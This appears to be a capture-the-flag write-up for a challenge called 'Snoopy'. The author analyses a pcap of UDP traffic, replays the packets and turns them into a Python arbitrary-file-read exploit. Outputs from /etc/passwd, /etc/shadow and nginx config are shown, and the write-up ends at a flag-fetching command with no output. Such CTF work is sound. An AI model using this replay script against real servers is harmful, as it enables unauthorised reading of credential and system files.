## Snoopy [477 pts]

**Category:** Misc
**Solves:** 1

### Description
The Snoopy challenge involves analyzing unusual traffic captured from a recent APT attack by anonymous hackers; your task is to uncover the hidden secret flag!

## Solution

**Note:** I did not fully solve the challenge and this writeup will be updated soon


Opening the pcap file, we see a comuncation between two IPs which one them is the attacker that created the attack. It's a simple udp connection.
![image1](images/image1.jpg)

Let's follow udp stream and we get this:
![image2](images/image2.jpg)

It seem attacker send a couple of udp packets and was able to make an access to do Code Execution on server and read `/etc/passwd` file.

To solve the challenge We should simulate the same requests to be able to read `/etc/passwd`, if successfull then we can try to read other files on the server too.

First get packet details using `tshark`.
```bash
tshark -r snoopy.pcap -Y "udp" -T fields -e ip.src -e ip.dst -e data > packets.txt
```
Using this command we will fetch `ip source`, `ip destination` and `data` field of each packet separated in each line. 

the result of it is as follow:

```
192.168.116.160 65.109.198.183  800000000000000000000000000000005544543f0000000157b1aff4000005dc000020000000000108afafb5000000006e201b25000000000000000000000000
65.109.198.183  192.168.116.160 80000000000000000000000008afafb55544543f0000000157b1aff4000005dc000020000000000108afafb5556bc62a6e201b25000000000000000000000000
192.168.116.160 65.109.198.183  800000000000000000000000000000005544543f0000000157b1aff4000005dc00002000ffffffff08afafb5556bc62a6e201b25000000000000000000000000
65.109.198.183  192.168.116.160 80000000000000000000000008afafb55544543f0000000157b1aff4000005dc00002000ffffffff2751be77556bc62a2dca6352000000000000000000000000
192.168.116.160 65.109.198.183  57b1aff4c0000001000346c42751be770b000000
192.168.116.160 65.109.198.183  57b1aff5c0000002000346da2751be772f6574632f706173737764
65.109.198.183  192.168.116.160 80020000000000010000000008afafb557b1aff5000182430000c35000001ffe00000001000003e8
65.109.198.183  192.168.116.160 80020000000000020000000008afafb557b1aff6000182430000c35000001ffe
192.168.116.160 65.109.198.183  8006000000000001000000002751be7700000000
192.168.116.160 65.109.198.183  8006000000000002000000002751be7700000000
65.109.198.183  192.168.116.160 57b1aff4c000000100019d5708afafb59a03000000000000
192.168.116.160 65.109.198.183  8002000000000001000000002751be7757b1aff50001859900006fa200001ffe00000001000003e8
65.109.198.183  192.168.116.160 57b1aff5e000000200019e9608afafb5726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a
192.168.116.160 65.109.198.183  8002000000000002000000002751be7757b1aff60001859900006fa200001ffe
192.168.116.160 65.109.198.183  8005000000000000000000002751be7700000000
65.109.198.183  192.168.116.160 80060000000000010000000008afafb500000000
65.109.198.183  192.168.116.160 80060000000000020000000008afafb500000000
```

let's write a code to simulate this scenario:
```python

import socket
import time

victim_port = 12431
local_port = 47756
attacker_ip = '192.168.116.160'

# Read packets from the extracted file
packets = []
with open('packets.txt', 'r') as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) >= 3:  # Assuming src, dst, and data are present
            src_ip = parts[0]
            dst_ip = parts[1]
            data_hex = parts[2]
            data = bytes.fromhex(data_hex)  # Convert hex data to bytes
            packets.append((src_ip, dst_ip, data))

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(0.1)  # Set timeout to 0.1 seconds

# Bind the socket to the local port (if needed)
sock.bind(('', local_port))

# Simulate sending the packets
chall = ''
for src_ip, dst_ip, data in packets:
    if src_ip == attacker_ip:
        sock.sendto(data, (dst_ip, victim_port))

# Close the socket
sock.close()

```

and run this script. But remember to also run a wireshark instance and try to capture network traffic with filer of `ip.addr == 65.109.198.183` like image below:

![image3](images/image3.jpg)

And as you can see, only one packet is received from the server. Something is wrong.
I did alot of time wast on this part and couldn't pass this section until the end of competion.
But my teammate found that there is a difference between the packet received from server on the `snoopy.pcap` and our packet captured.

let's check them here:

```
snoopy.pcap first packet received from server
80000000000000000000000008afafb55544543f0000000157b1aff4000005dc000020000000000108afafb5556bc62a6e201b25000000000000000000000000

our captured packet
80000000000000000000000008afafb55544543f0000000157b1aff4000005dc000020000000000108afafb59fa46f716e201b25000000000000000000000000
```

The difference is from hex value 88 to 96.

Let's look at the first packet sent to server after receiving it from server on the attacker scenario.
```
Data: 800000000000000000000000000000005544543f0000000157b1aff4000005dc00002000ffffffff08afafb5556bc62a6e201b25000000000000000000000000
```

As you can see: `556bc62a` is sent in the payload of attacker.

So we should change our id from hex 88 to 96 in the payload and send the request. see if it's working or not.

Let's write a code that find this difference and replace this id with our id received from server in next request:

```python
import socket
import time
import random

victim_port = 12431
local_port = 47756
local_port = random.randint(10000, 30000)
attacker_ip = '192.168.116.160'
victim_ip = '65.109.198.183'


def find_differences(str1, str2):
    min_len = min(len(str1), len(str2))
    differences = []
    diff_text = ''
    position = 0
    for index in range(min_len):
        if str1[index] != str2[index]:
            position = position if diff_text != '' else index
            diff_text += str1[index]
        else:
            if diff_text:
                differences.append({'position': position, 'text': [diff_text, str2[position: position + len(diff_text)]]})
                diff_text = ''
                position = 0
    return differences

def send_payload(payload, timeout=0.1):
    print(payload)
    payload = bytes.fromhex(payload)
    sock.sendto(payload, (victim_ip, victim_port))
    time.sleep(timeout)


# Read packets from the extracted file
packets = []
with open('packets.txt', 'r') as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) < 3:  
            continue
        src_ip = parts[0]
        dst_ip = parts[1]
        data = parts[2]
        packets.append({'src_ip': src_ip, 'dst_ip': dst_ip, 'data': data})


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(2)  # Set timeout to 0.1 seconds

# Bind the socket to the local port (if needed)
sock.bind(('', local_port))

print('[+] Sending Packet1')
payload = packets[0]['data']
send_payload(payload)

print('[+] Waiting for any response from server')
response, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
differences = find_differences(response.hex(), packets[1]['data'])
secret_id1 = differences[0]['text'][0]
origin_secret_id1 = differences[0]['text'][1]
print(secret_id1, origin_secret_id1)

print('[+] Sending Packet2')
payload_original = packets[2]['data']
payload_new = payload_original.replace(origin_secret_id1, secret_id1)
send_payload(payload_new)
```

Asn you can see when sending packet2, we replaces value of secretId received from server response, with the original secretId that was in the pcap file in the first place.

As you can see in the image, we received the next response from server:

![image4](images/image4.jpg)

Checking the difference of payload received from server and pcap file:

```
snoopy.pcap second packet received from server
80000000000000000000000008afafb55544543f0000000157b1aff4000005dc00002000ffffffff2751be77556bc62a2dca6352000000000000000000000000

our captured packet
80000000000000000000000008afafb55544543f0000000157b1aff4000005dc00002000ffffffff34b2cba6ed523ec6925410d4000000000000000000000000
```

also if we check the request sent after this in pcap file:

```
57b1aff4c0000001000346c42751be770b000000
```

we can see that only `2751be77` is the secret challenge. So from hex value 80 to position 88 also should be considered as packet challenge and should be replaced.


Ok now we know all the secret in HEX Values;
```
secret1 = '556bc62a'
secret2 = '2751be77'
```
from now on, in requests we should always replace this secrets with our received secrets.

Now let's check the next two packets that are sent from attacker:
```
192.168.116.160 65.109.198.183  57b1aff4c0000001000346c42751be770b000000
192.168.116.160 65.109.198.183  57b1aff5c0000002000346da2751be772f6574632f706173737764
```

the Payloads seem to be like this:

```
packet3: 57b1aff4c0000001000346c4 + secret2 + '0b000000'
packet4: 57b1aff5c0000002000346c4 + secret2 + '2f6574632f706173737'
```

checking these values we understand that `0b000000` is equivalent of 11 value in little endian format.
And `2f6574632f706173737` is `/etc/passwd` format. Now we know that first packet is used to send filename length in little endian format, and the next one is the filename.


let's send this payload without chaning filename to see if it is working or not:

```python
import socket
import time
import random

victim_port = 12431
local_port = 47756
local_port = random.randint(10000, 30000)
attacker_ip = '192.168.116.160'
victim_ip = '65.109.198.183'


# Read packets from the extracted file
packets = []
with open('packets.txt', 'r') as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) < 3:  
            continue
        src_ip = parts[0]
        dst_ip = parts[1]
        data = parts[2]
        packets.append({'src_ip': src_ip, 'dst_ip': dst_ip, 'data': data})


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(2)  # Set timeout to 0.1 seconds

# Bind the socket to the local port (if needed)
sock.bind(('', local_port))

def send_payload(payload, timeout=0.1):
    print(payload)
    payload = bytes.fromhex(payload)
    sock.sendto(payload, (victim_ip, victim_port))
    time.sleep(timeout)

print('[+] Sending Packet1')
payload = packets[0]['data']
send_payload(payload)

print('[+] Waiting for any response from server')
response, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
secret_id1 = response.hex()[88:96]

print('[+] Sending Packet2')
payload = packets[2]['data']
payload = payload.replace('556bc62a', secret_id1)
send_payload(payload)

print('[+] Waiting for any response from server')
response, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
secret_id2 = response.hex()[80:88]

print('[+] Sending next packet containing file length')
payload = packets[4]['data']
payload = payload.replace('2751be77', secret_id2)
send_payload(payload)

print('[+] Sending payload read file')
payload = packets[5]['data']
payload = payload.replace('2751be77', secret_id2)
send_payload(payload)

for i in range(10):
    response, addr = sock.recvfrom(2048)  # Buffer size is 1024 bytes
    response_text = response.decode('utf-8', errors='ignore')
    print(response_text)
```

Running this will get us this result:
```bash
> python solve.py
[+] Sending Packet1
800000000000000000000000000000005544543f0000000157b1aff4000005dc000020000000000108afafb5000000006e201b25000000000000000000000000
[+] Waiting for any response from server
[+] Sending Packet2
800000000000000000000000000000005544543f0000000157b1aff4000005dc00002000ffffffff08afafb5378b5e126e201b25000000000000000000000000
[+] Waiting for any response from server
[+] Sending next packet containing file length
57b1aff4c0000001000346c434b2cba00b000000
[+] Sending payload read file
57b1aff5c0000002000346da34b2cba02f6574632f706173737764

WP
WP
W
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

WP
```

And as you can see we are able to comunicate with server.
Ok now let's read another files.

Update code like this:
```python
import sys
import socket
import time
import random

victim_port = 12431
local_port = 47756
local_port = random.randint(10000, 30000)
attacker_ip = '192.168.116.160'
victim_ip = '65.109.198.183'


# Read packets from the extracted file
packets = []
with open('packets.txt', 'r') as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) < 3:  
            continue
        src_ip = parts[0]
        dst_ip = parts[1]
        data = parts[2]
        packets.append({'src_ip': src_ip, 'dst_ip': dst_ip, 'data': data})


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(2)  # Set timeout to 0.1 seconds

# Bind the socket to the local port (if needed)
sock.bind(('', local_port))

def send_payload(payload, timeout=0.1):
    print(payload)
    payload = bytes.fromhex(payload)
    sock.sendto(payload, (victim_ip, victim_port))
    time.sleep(timeout)

print('[+] Sending Packet1')
payload = packets[0]['data']
send_payload(payload)

print('[+] Waiting for any response from server')
response, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
secret_id1 = response.hex()[88:96]
print(f'Secret1 is {secret_id1}')

print('[+] Sending Packet2')
payload = packets[2]['data']
payload = payload.replace('556bc62a', secret_id1)
send_payload(payload)

print('[+] Waiting for any response from server')
response, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
secret_id2 = response.hex()[80:88]
print(f'Secret2 is {secret_id2}')

print('[+] Sending next packet containing file length')
file_name = sys.argv[1].encode()
payload = f'57b1aff4c0000001000346c4' + secret_id2 + len(file_name).to_bytes(4, byteorder='little').hex()
send_payload(payload)

print('[+] Sending payload read file')
payload = f'57b1aff5c0000002000346c4' + secret_id2 + file_name.hex()
send_payload(payload)

for i in range(100):
    response, addr = sock.recvfrom(2048)  # Buffer size is 1024 bytes
    response_text = response.decode('utf-8', errors='ignore')
    print(response_text)
```

And now we can run and read a any file from server like this:
```bash
$ python solve.py /etc/shadow

WP
W�!
oot:*:19977:0:99999:7:::
daemon:*:19977:0:99999:7:::
bin:*:19977:0:99999:7:::
sys:*:19977:0:99999:7:::
sync:*:19977:0:99999:7:::
games:*:19977:0:99999:7:::
man:*:19977:0:99999:7:::
lp:*:19977:0:99999:7:::
mail:*:19977:0:99999:7:::
news:*:19977:0:99999:7:::
uucp:*:19977:0:99999:7:::
proxy:*:19977:0:99999:7:::
www-data:*:19977:0:99999:7:::

```

I tried to read flag from locations like `/app/flag.txt`, `~/flag.txt`, `/flag.txt` and .., But nothing worked.
If you check the ip on web browser you can see that there is an nginx running. let's try to read some nginx files.


Read from `/etc/nginx/nginx.conf`
```bash
$ python solve.py /etc/nginx/nginx.conf

Wuser www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {

    ##
    # Basic Settings
    ##

    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    server_tokens off;

    # server_names_hash_bucket_size 64;
    # server_name_in_redirect off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ##
    # SSL Settings
    ##

    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
    ssl_prefer_server_ciphers on;

    ##
    # Logging Settings
    ##

    access_log /dev/null;
    error_log /dev/null;

    ##
    # Gzip Settings
    ##

    gzip on;

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}

```

And check many other files, Finaly on checking `/etc/nginx/sites-available/default` got something:
```bash
server {
    listen 80;
    server_name h0w-f1nd-7hi5-n9inx-c0nfi9.udt;
    root /var/www/html_udt;
    index index.html index.htm index.nginx-debian.html;
    location / {
        try_files $uri $uri/ =404;
    }
}
```

And then checking:

```bash
> python solve.py /var/www/html_udt/index.html
[+] Sending Packet1
800000000000000000000000000000005544543f0000000157b1aff4000005dc000020000000000108afafb5000000006e201b25000000000000000000000000
[+] Waiting for any response from server
Secret1 is 013abcf2
[+] Sending Packet2
800000000000000000000000000000005544543f0000000157b1aff4000005dc00002000ffffffff08afafb5013abcf26e201b25000000000000000000000000
[+] Waiting for any response from server
Secret2 is 34b2cb80
[+] Sending next packet containing file length
57b1aff4c0000001000346c434b2cb801c000000
[+] Sending payload read file
57b1aff5c0000002000346c434b2cb802f7661722f7777772f68746d6c5f7564742f696e6465782e68746d6c
WP
WP
W
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Important Message Revealer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            background-color: #28a745;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
        .message {
            display: none;
            margin-top: 20px;
            font-size: 18px;
            color: #333;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Welcome!</h1>
    <button id="revealButton">Reveal Important Message</button>
    <div class="message" id="importantMessage">
        <p><strong>Please try to get the flag from <a href="./_path_af060bf6a9505b4f8f59b35845f2b78a/flag.txt" target="_blank">here!</a></strong></p>
   
W </div>
</div>
```

and finaly the flag:
```bash
> python solve.py /var/www/html_udt/_path_af060bf6a9505b4f8f59b35845f2b78a/flag.txt
```
